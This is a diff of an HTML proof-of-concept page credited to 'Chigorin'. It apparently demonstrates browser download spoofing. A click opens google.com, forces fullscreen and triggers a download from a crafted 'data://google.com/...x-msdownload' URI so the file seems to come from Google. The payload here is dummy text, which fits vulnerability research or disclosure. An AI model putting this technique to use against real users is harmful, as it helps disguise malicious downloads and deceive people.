@@ -6,16 +6,18 @@
 </head>
 <body>
   <center><h2>POC by Chigorin!</h2></center>
+  <input type="text" id="triggerInput">
 
 
   <script>
-    // Listen to any keydown
-    window.addEventListener('keydown', function(e) {
-      // open the download
-      openWin();
+    document.getElementById('triggerInput').addEventListener('click', function() {
       // request fullscreen
-      //goFullScreen();
-    });
+ setTimeout(function() {
+        openWin();
+ }, 500);
+ window.open('https://www.google.com', '_blank');
+      goFullScreen();
+    }, { once: false }); // Use { once: true } to ensure it only fires once
 
     // Download helper
     function Puf(uri, name) {
@@ -31,8 +33,20 @@
     function openWin() {
       Puf(
         "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "google.apk"
+        "google11.txt"
       );
+    }
+    function goFullScreen() {
+      const element = document.documentElement;
+      if (element.requestFullscreen) {
+        element.requestFullscreen();
+      } else if (element.mozRequestFullScreen) { // Firefox
+        element.mozRequestFullScreen();
+      } else if (element.webkitRequestFullscreen) { // Chrome, Safari and Opera
+        element.webkitRequestFullscreen();
+      } else if (element.msRequestFullscreen) { // IE/Edge
+        element.msRequestFullscreen();
+      }
     }
 
 
